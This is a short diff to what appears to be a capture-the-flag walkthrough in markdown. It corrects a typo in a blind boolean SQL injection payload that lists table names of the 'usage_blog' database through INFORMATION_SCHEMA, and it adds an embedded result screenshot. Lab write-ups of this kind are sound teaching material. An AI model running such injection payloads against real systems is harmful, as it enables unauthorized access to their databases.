@@ -139,5 +139,7 @@ if __name__ == '__main__':
 
 The script run slow but works, we are getting the database name
 Database name: `usage_blog`
-- now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ', ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'asuge_blog'),1,1) = 'a' -- -`
+- now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ', ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'usage_blog'),1,1) = 'a' -- -`
+>[!example]- Result
+>![[Pasted image 20250320184858.png]]
 
